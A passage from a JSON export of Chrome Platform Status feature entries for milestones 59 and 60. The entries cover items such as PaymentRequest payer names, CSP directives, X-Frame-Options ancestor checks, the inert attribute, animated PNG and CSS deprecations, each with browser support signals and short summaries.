        "http://www.webmproject.org/vp9/mp4/"
      ],
      "samples": [
        "https://cs.chromium.org/chromium/src/media/test/data/bear-320x240-v_frag-vp9.mp4"
      ]
    }
  },
  {
    "category": "Misc",
    "updated": {
      "when": "2018-02-05 23:14:38.521170",
      "by": "jmedley@google.com"
    },
    "name": "Support for collecting payer's name for PaymentRequest.",
    "tags": [
      "payment",
      "PaymentRequest",
      "payment api",
      "payerName",
      "payer name"
    ],
    "comments": "https://www.chromestatus.com/feature/5639348045217792",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://github.com/w3c/browser-payment-api/pull/270",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 60
        },
        "owners": [
          "jinho.bang@samsung.com"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>Payments"
        ],
        "desktop": 60,
        "flag": false,
        "android": 58,
        "bug": "http://crbug.com/648051",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "If the requestPayerName flag was set to true in the PaymentOptions passed to the PaymentRequest constructor, then UA should collect and return the payer's name as part of the payment request.\r\n\r\nFor example, this would be set to true to allow merchant to make a booking in the payer's name.\r\n\r\n This option has been behind a flag on mobile since Chrome 55. On desktop, it's shipping in Chrome 60 with the rest of Payment Request API.",
    "id": 5674107207155712,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/API/PaymentRequest/PaymentRequest"
      ]
    }
  },
  {
    "category": "Misc",
    "updated": {
      "when": "2017-06-16 02:37:36.674010",
      "by": "ericbidelman@google.com"
    },
    "name": "Web payment manifests",
    "comments": "",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 2
      },
      "spec": "https://w3c.github.io/payment-method-manifest/",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://groups.google.com/a/chromium.org/d/msg/blink-dev/gQCGIrnMxFU/F6cy9CtiCQAJ",
          "text": "Public support",
          "val": 3
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 60
        },
        "owners": [
          "rouslan@chromium.org",
          "zkoch@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>Payments"
        ],
        "flag": false,
        "android": 60,
        "bug": "http://crbug.com/684655",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "For every payment method, there must be a corresponding JSON manifest file describing how that method participates in the web payments ecosystem.",
    "id": 5716168929181696,
    "resources": {
      "docs": [
        "https://github.com/zkoch/zkoch.github.io/blob/master/pmi-v2.md",
        "https://docs.google.com/document/d/1izV4uC-tiRJG3JLooqY3YRLU22tYOsLTNq0P_InPJeE"
      ]
    }
  },
  {
    "category": "Security",
    "updated": {
      "when": "2017-10-24 17:13:08.326850",
      "by": "jmedley@google.com"
    },
    "name": "X-Frame-Options: SAMEORIGIN matches all ancestors.",
    "comments": "",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 2
      },
      "spec": "https://tools.ietf.org/html/rfc7034",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=725490",
          "text": "Public support",
          "val": 3
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 60
        },
        "owners": [
          "mkwst@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 60,
        "blink_components": [
          "Blink>SecurityFeature"
        ],
        "desktop": 60,
        "flag": false,
        "android": 60,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=250309",
        "intervention": false
      },
      "opera": {
        "android": 47,
        "desktop": 47
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Currently, XFO performs a same origin check only against the top-level frame in a document's ancestor chain. As lcamtuf notes in [1], \"Any site that allows a rogue ad to be displayed in an IFRAME; or that frames third-party content for other reasons (e.g., iGoogle, Image Search results, Facebook gadgets), is effectively not protected).\" We should check all ancestors instead.",
    "id": 4678102647046144,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options"
      ]
    }
  },
  {
    "category": "DOM",
    "updated": {
      "when": "2017-09-18 02:33:56.183720",
      "by": "jmedley@google.com"
    },
    "name": "createElementNS() : Throw InvalidCharacterError instead of NamespaceError on validating a qualified name",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 2
      },
      "spec": "https://dom.spec.whatwg.org/#validate",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Behind a flag",
          "val": 4,
          "milestone_str": 60
        },
        "owners": [
          "shanmuga.m@samsung.com"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 60,
        "blink_components": [
          "Blink>DOM"
        ],
        "desktop": 60,
        "flag": true,
        "android": 60,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=702077",
        "intervention": false
      },
      "opera": {
        "android": 47,
        "desktop": 47
      },
      "edge": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "createElementNS() should now throw only InvalidCharacterError, not NamespaceError.\r\n\r\nValidating a qualified name should only throw InvalidCharacterError, not NamespaceError,\r\nafter:\r\n https://github.com/whatwg/dom/issues/319\r\n https://github.com/w3c/web-platform-tests/issues/5161\r\n https://github.com/whatwg/dom/issues/423\r\n\r\nLatest spec:\r\n https://dom.spec.whatwg.org/#validate",
    "id": 5918678717562880,
    "resources": {}
  },
  {
    "category": "DOM",
    "updated": {
      "when": "2017-06-14 18:28:51.326680",
      "by": "ericbidelman@google.com"
    },
    "name": "getElementsByTagName accepts qualified names",
    "tags": [
      "DOM"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 2
      },
      "spec": "https://dom.spec.whatwg.org/#concept-getelementsbytagname",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 60
        },
        "owners": [
          "tkent@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 60,
        "blink_components": [
          "Blink>DOM"
        ],
        "desktop": 60,
        "flag": false,
        "android": 60,
        "bug": "http://crbug.com/645165",
        "intervention": false
      },
      "opera": {
        "android": 47,
        "desktop": 47
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "url": "http://trac.webkit.org/changeset/204441",
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "getElementsByTagName() used to accept only local names. The DOM specification was updated to accept qualified names.\r\n",
    "id": 5673616809132032,
    "resources": {}
  },
  {
    "category": "DOM",
    "updated": {
      "when": "2018-07-03 05:36:09.508960",
      "by": "aboxhall@chromium.org"
    },
    "name": "inert attribute",
    "tags": [
      "inert",
      "focus",
      "accessibility",
      "keyboard",
      "events",
      "pointer"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Public discussion",
        "val": 5
      },
      "footprint": {
        "val": 3
      },
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Public support",
          "val": 3
        }
      },
      "chrome": {
        "status": {
          "text": "Behind a flag",
          "val": 4,
          "milestone_str": 60
        },
        "owners": [
          "aboxhall@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 60,
        "blink_components": [
          "Blink>HTML"
        ],
        "desktop": 60,
        "flag": true,
        "android": 60,
        "bug": "http://crbug.com/692360",
        "intervention": false
      },
      "opera": {
        "android": 47,
        "desktop": 47
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "Public support",
          "val": 3
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "The inert attribute would allow web authors to mark parts of the DOM tree as inert:\r\n\r\nWhen a node is inert, then the user agent must act as if the node was absent for the purposes of targeting user interaction events, may ignore the node for the purposes of text search user interfaces (commonly known as \"find in page\"), and may prevent the user from selecting text in that node.",
    "id": 5703266176335872,
    "resources": {
      "docs": [
        "https://github.com/WICG/inert#tldr",
        "https://discourse.wicg.io/t/inert-attribute/1838/",
        "https://developer.mozilla.org/en-US/docs/Web/API/HTMLElement"
      ],
      "samples": [
        "https://wicg.github.io/inert/demo/"
      ]
    }
  },
  {
    "category": "User input",
    "updated": {
      "when": "2018-02-05 22:45:24.443710",
      "by": "jmedley@google.com"
    },
    "name": "rAF Aligned Mouse Events",
    "comments": "https://groups.google.com/a/chromium.org/forum/#!topic/input-dev/Aqdge_cj060",
    "standards": {
      "status": {
        "text": "No public standards discussion",
        "val": 6
      },
      "footprint": {
        "val": 4
      },
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Behind a flag",
          "val": 4,
          "milestone_str": 60
        },
        "owners": [
          "dtapuska@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 60,
        "blink_components": [
          "Blink>Input"
        ],
        "desktop": 60,
        "flag": true,
        "android": 60,
        "bug": "https://crbug.com/703344",
        "intervention": false
      },
      "opera": {
        "android": 48,
        "desktop": 48
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Mixed signals",
          "val": 3
        }
      }
    },
    "summary": "Align continuous mouse events (mousemove, mousewheel) so that they occur close to requestAnimationFrame() as possible.\r\n\r\nHistorical events can be accessed via getCoalescedEvents (see https://w3c.github.io/pointerevents/extension.html#extensions-to-the-pointerevent-interface)",
    "id": 6192761317359616,
    "resources": {
      "docs": [
        "https://docs.google.com/document/d/1aM9AqyYuceRHOmsJZXFKcgi_D4jvFAymYvI36OEwIpI/edit#",
        "https://developer.mozilla.org/en-US/docs/Web/API/window/requestAnimationFrame",
        "https://developer.mozilla.org/en-US/docs/Web/Events/mousemove",
        "https://developer.mozilla.org/en-US/docs/Web/Events/wheel"
      ],
      "samples": [
        "http://rbyers.github.io/event-timing.html"
      ]
    }
  },
  {
    "category": "Graphics",
    "updated": {
      "when": "2017-07-03 05:00:32.695930",
      "by": "ericbidelman@google.com"
    },
    "first_of_milestone": true,
    "name": "Animated PNG",
    "tags": [
      "apng"
    ],
    "comments": "Animated PNG is backwards compatible with PNG, and the first frame will be shown (or used to make a thumbnail) by PNG-only apps. \r\n\r\nOther frames are stored very similarly to first-frame PNG, but the rectangles can be smaller and transparency can be used for inter-frame optimization: http://littlesvr.ca/apng/inter-frame.html \r\n\r\nImplementation is expected to be small, and rely on existing libpng to extract the animated image frames.\r\n",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 5
      },
      "spec": "https://wiki.mozilla.org/APNG_Specification",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 59
        },
        "owners": [
          "scroggo@chromium.org",
          "hcm@chromium.org",
          "maxstepin@gmail.com",
          "noel@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>Image"
        ],
        "desktop": 59,
        "flag": false,
        "android": 59,
        "bug": "http://crbug.com/437662",
        "intervention": false
      },
      "opera": {
        "android": 46,
        "desktop": 46
      },
      "edge": {
        "view": {
          "url": "https://developer.microsoft.com/en-us/microsoft-edge/platform/status/apngimageformat/",
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "Support for animated PNG images",
    "id": 6691520493125632,
    "resources": {
      "docs": [
        "https://en.wikipedia.org/wiki/APNG#Technical_details",
        "https://en.wikipedia.org/wiki/APNG#/media/File:Apng_assembling.svg",
        "http://philip.html5.org/tests/apng/tests.html"
      ],
      "samples": [
        "http://littlesvr.ca/apng/gif_apng_webp1.html",
        "http://people.mozilla.org/~dolske/apng/demo.html",
        "http://photobucket.com/apng"
      ]
    }
  },
  {
    "category": "Security",
    "updated": {
      "when": "2018-01-17 17:43:47.839440",
      "by": "jmedley@google.com"
    },
    "name": "CSP hash expressions can match external scripts.",
    "comments": "",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 2
      },
      "spec": "https://w3c.github.io/webappsec-csp/#external-hash",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://github.com/w3c/webappsec-csp/issues/78",
          "text": "Public support",
          "val": 3
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 59
        },
        "owners": [
          "treib@chromium.org",
          "mkwst@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 59,
        "blink_components": [
          "Blink"
        ],
        "desktop": 59,
        "flag": false,
        "android": 59,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=706380",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "CSP3 allows hash expressions to match external scripts, by relying on SRI as underlying infrastructure. That is, given `Content-Security-Policy: script-src 'sha256-abc123' 'sha512-321cba'`, `<script integrity=\"sha256-abc123\" ...></script>` will be allowed.",
    "id": 4626666856906752,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/default-src"
      ]
    }
  },
  {
    "category": "Security",
    "updated": {
      "when": "2017-06-16 03:51:44.349720",
      "by": "ericbidelman@google.com"
    },
    "name": "CSP3: The 'worker-src' directive",
    "comments": "",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 2
      },
      "spec": "https://w3c.github.io/webappsec-csp/#directive-worker-src",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1302667",
          "text": "Public support",
          "val": 3
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 59
        },
        "owners": [
          "mkwst@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 59,
        "blink_components": [
          "Blink>SecurityFeature"
        ],
        "desktop": 59,
        "flag": false,
        "android": 59,
        "bug": "https://crbug.com/662930",
        "intervention": false
      },
      "opera": {
        "android": 48,
        "desktop": 48
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "The 'worker-src' directive restricts the URLs which may be loaded as a Worker, SharedWorker, or ServiceWorker. It falls back to 'child-src' (which, in turn, falls back to 'default-src').",
    "id": 5922594955984896,
    "resources": {}
  },
  {
    "category": "Security",
    "updated": {
      "when": "2018-06-06 19:35:33.132265",
      "by": "ericbidelman@google.com"
    },
    "name": "CSP: `report-sample` property in violation reports",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://w3c.github.io/webappsec-csp/#deprecated-serialize-violation",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 59
        },
        "owners": [
          "mkwst@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 59,
        "blink_components": [
          "Blink>SecurityFeature"
        ],
        "desktop": 59,
        "flag": false,
        "android": 59,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=606774",
        "intervention": false
      },
      "opera": {
        "android": 46,
        "desktop": 46
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "The `report-sample` property attempts to reach consensus on an opt-in variant Firefox's behavior. In short, we'll collect a 40-character sample for inline script and style violations, and include it in the violation report (and associated SecurityPolicyViolationEvent object) iff a 'report-sample' expression is present in the violated directive.",
    "id": 5792234276388864,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/script-src"
      ]
    }
  },
  {
    "category": "CSS",
    "updated": {
      "when": "2017-07-18 17:11:45.327120",
      "by": "jmedley@google.com"
    },
    "name": "CSS Box Alignment shorthands",
    "tags": [
      "css box alignment shorthand"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 3
      },
      "spec": "https://drafts.csswg.org/css-align-3/",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1319958",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 59
        },
        "owners": [
          "jfernandez@igalia.com"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 59,
        "blink_components": [
          "Blink"
        ],
        "desktop": 59,
        "flag": false,
        "android": 59,
        "bug": "https://crbug.com/668639",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "url": "https://bugs.webkit.org/show_bug.cgi?id=168845",
          "text": "In development",
          "val": 2
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "Shorthand properties to control the alignment behavior along block and inline axes in a single declaration. \r\n",
    "id": 4689076657586176,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/CSS/place-content",
        "https://developer.mozilla.org/en-US/docs/Web/CSS/place-self",
        "https://developer.mozilla.org/en-US/docs/Web/CSS/place-items"
      ]
    }
  },
  {
    "category": "CSS",
    "updated": {
      "when": "2018-05-30 18:33:03.763420",
      "by": "fmalita@chromium.org"
    },
    "name": "CSS gradient color stop double-position syntax",
    "tags": [
      "gradient",
      "color stop",
      "css-images-4"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 5
      },
      "spec": "https://drafts.csswg.org/css-images-4/#color-stop-syntax",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1352643",
          "text": "In development",
          "val": 2
        }
      },
      "chrome": {
        "status": {
          "text": "Behind a flag",
          "val": 4,
          "milestone_str": 59
        },
        "owners": [
          "fmalita@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>CSS"
        ],
        "desktop": 59,
        "flag": true,
        "android": 59,
        "bug": "http://crbug.com/707047",
        "intervention": false
      },
      "opera": {
        "android": 46,
        "desktop": 46
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "Add support for CSS Image Values 4 color stop position syntax.\r\n\r\nCurrently, repeating colors require explicit positions, e.g.:\r\n\r\n  linear-gradient(45deg, black 25%, black 50%, white 50%, white 75%)\r\n\r\nTo simplify the definition of solid color bands, css-images-4 allows specifying up to two positions for a color:\r\n\r\n  linear-gradient(45deg, black 25% 50%, white 50% 75%)",
    "id": 5712111258828800,
    "resources": {
      "samples": [
        "https://leaverou.github.io/conic-gradient/"
      ]
    }
  },
  {
    "category": "DOM",
    "updated": {
      "when": "2017-06-14 18:29:03.624700",
      "by": "ericbidelman@google.com"
    },
    "name": "DIALOG element has display:block style by default",
    "comments": "",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://html.spec.whatwg.org/multipage/rendering.html#flow-content-3",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 59
        },
        "owners": [
          "martin@martinrogalla.com"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 59,
        "blink_components": [
          "Blink>HTML"
        ],
        "desktop": 59,
        "flag": false,
        "android": 59,
        "bug": "http://crbug.com/704848",
        "intervention": false
      },
      "opera": {
        "android": 46,
        "desktop": 46
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "The default display style of a DIALOG element is changed from inline to block.\r\n",
    "id": 5754335753404416,
    "resources": {}
  },
  {
    "category": "DOM",
    "updated": {
      "when": "2017-08-07 22:05:10.980830",
      "by": "jmedley@google.com"
    },
    "name": "Deprecate SVGTests.requiredFeatures attribute",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 2
      },
      "spec": "https://svgwg.org/svg2-draft/",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Removed",
          "val": 7,
          "milestone_str": 59
        },
        "owners": [
          "shanmuga.m@samsung.com"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 59,
        "blink_components": [
          "Blink"
        ],
        "desktop": 59,
        "flag": false,
        "android": 59,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=635420",
        "intervention": false
      },
      "opera": {
        "android": 46,
        "desktop": 46
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "In SVG2, hasFeature always return true.\r\nSo requiredFeatures attribute not doing anything useful.\r\n\r\nIt has been removed from the spec:\r\nhttps://github.com/w3c/svgwg/commit/9a30d01f6410dc516c5f874d71e957230a3448cd\r\n\r\nThis was deprecated in Chrome 54/Opera 41.\r\n",
    "id": 5720709590417408,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/API/SVGTests"
      ]
    }
  },
  {
    "category": "Network / Connectivity",
    "updated": {
      "when": "2017-06-14 18:29:04.941500",
      "by": "ericbidelman@google.com"
    },
    "name": "Deprecate and Disable SDCH",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 2
      },
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Deprecated",
          "val": 6,
          "milestone_str": 59
        },
        "owners": [
          "rdsmith@chromium.org",
          "rsleevi@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 59,
        "ios": 59,
        "blink_components": [
          "Internals>Network>Filters"
        ],
        "desktop": 59,
        "flag": false,
        "android": 59,
        "bug": "http://crbug.com/690070",
        "intervention": false
      },
      "opera": {
        "android": 59,
        "desktop": 59
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "SDCH is a shared dictionary compression mechanism developed by Google but not standardized.  It's use in chrome is being discontinued.\r\n\r\nIntent to deprecate thread: https://groups.google.com/a/chromium.org/forum/#!searchin/blink-dev/SDCH%7Csort:relevance/blink-dev/nQl0ORHy7sw/HNpR96sqAgAJ",
    "id": 5763176272494592,
    "resources": {}
  },
  {
    "category": "CSS",
    "updated": {
      "when": "2017-06-14 18:29:00.597970",
      "by": "ericbidelman@google.com"
    },
    "name": "Deprecate and remove -internal-media-controls-cast-button",
    "comments": "",
    "standards": {
      "status": {
        "text": "No public standards discussion",
        "val": 6
      },
      "footprint": {
        "val": 2
      },
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Removed",
          "val": 7,
          "milestone_str": 59
        },
        "owners": [
          "mlamouri@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>CSS"
        ],
        "desktop": 59,
        "flag": false,
        "android": 59,
        "bug": "https://crbug.com/678285",
        "intervention": false
      },
      "opera": {
        "android": 46,
        "desktop": 46
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "-internal-media-controls-cast-button selector exposes Blink internal shadow DOM to the web content. Authors that want to have a custom cast button should use custom controls and implement a cast button with the Remote Playback API.",
    "id": 5734009183141888,
    "resources": {}
  },
  {
    "category": "CSS",
    "updated": {
      "when": "2017-06-14 18:28:48.752360",
      "by": "ericbidelman@google.com"
    },
    "name": "Deprecate and remove -internal-media-controls-text-track-list*",
    "comments": "",
    "standards": {
      "status": {
        "text": "No public standards discussion",
        "val": 6
      },
      "footprint": {
        "val": 2
      },
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Removed",
          "val": 7,
          "milestone_str": 59
        },
        "owners": [
          "mlamouri@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>CSS"
        ],
        "desktop": 59,
        "flag": false,
        "android": 59,
        "bug": "https://crbug.com/678285",
        "intervention": false
      },
      "opera": {
        "android": 46,
        "desktop": 46
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "-internal-media-controls-text-track-list* selectors expose Blink internal shadow DOM to the web content. Authors that want to have a custom text track picking interface should use custom controls.",
    "id": 5661431349379072,
    "resources": {}
  },
  {
    "category": "Device",
    "updated": {
      "when": "2017-09-17 10:33:26.825760",
      "by": "Patket@microsoft.com"
    },
    "name": "DeviceOrientationEvent and DeviceMotionEvent constructors",
    "comments": "",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 3
      },
      "spec": "https://w3c.github.io/deviceorientation/spec-source-orientation.html",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
